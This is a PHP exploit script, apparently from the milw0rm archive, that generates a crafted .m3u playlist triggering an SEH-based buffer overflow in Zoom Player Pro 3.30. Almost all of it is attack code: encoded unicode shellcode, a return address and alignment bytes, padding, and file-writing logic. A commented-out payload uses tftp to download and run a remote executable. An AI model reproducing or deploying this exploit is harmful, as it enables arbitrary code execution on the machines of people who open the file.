<?php
/*
  Zoom Player Pro v.3.30 .m3u file buffer overflow exploit (seh)
  by Nine:Situations:Group::surfista

  seems the same of http://secunia.com/advisories/28214/
  bug found by Luigi Auriemma
  no full working exploit out, so I made my test version
/*
/*
//original shellcode, 27 bytes + command
//re-encode with
//alpha2 --unicode ecx <sh.txt
$scode =
"\xeb\x13\x5b\x31\xc0\x50\x31\xc0\x88\x43\x4a\x53".
"\xbb\x0d\x25\x86\x7c". //WinExec, kernel32.dll XP SP3
"\xff\xd3\x31\xc0\xe8\xe8\xff\xff\xff".
"cmd /c tftp -i 192.168.0.1 GET s s.exe && s && ".
"\xff";
*/

$_scode="IAIAIAIAIAIAIAIAIAIAIAIAIAIA4444jXAQADAZABARALAYAIAQAIAQAIAhAAAZ1".
        "AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JBhkMC1Kn".
        "QWPnpNQGP3XPCPJaCEkJmo5TFsLYoHSNQUpiXgxyoKOKOosPmOtKpNOQSKp1d36rTp".
        "pkpNMpimPNQp9nRlnnQP6lxNNlplnP1MPPGQ524O0RSO02SnN35rXPeKpLfKvKp43kpkvmVMPkOA";

$buff="\x23\x45\x58\x54\x4d\x33\x55\x0d\x0a\x68\x74\x74\x70\x3a\x2f\x2f".
      "\x77\x77\x77".
       str_repeat("\x61",0xfe8).
       /* unicode preamble, alignment */
       "\x6e".                      //add byte ptr [esi],ch, nop equivalent [*]
       "\xd3\x45".                  //0x004500d3  unicode friendly pop - pop - ret, zplayer.exe
       "\x6e".                      //*
       "\x05\x7f\x4c".              //add eax,4c007f00h
       "\x6e".                      //*
       "\x2d\x59\x4c".              //sub eax,4c005900h
       "\x6e".                      //*
       "\x50".                      //push eax
       "\x6e".                      //*
       "\x59".                      //pop ecx
       str_repeat("\x6e\x90",0x7f). //nop
       "\x6e".                      //*
       "\x6a".                      //push 0, nop equivalent
       $_scode.
       str_repeat("\x90",0xbb8);
$_fp=@fopen("pwn.m3u","w+");
if (!$_fp) { die("[:(] Failed to create file...");}
fputs($_fp,$buff);
fclose($_fp);
print("[:)] Done!");
?>

# milw0rm.com [2009-04-27]
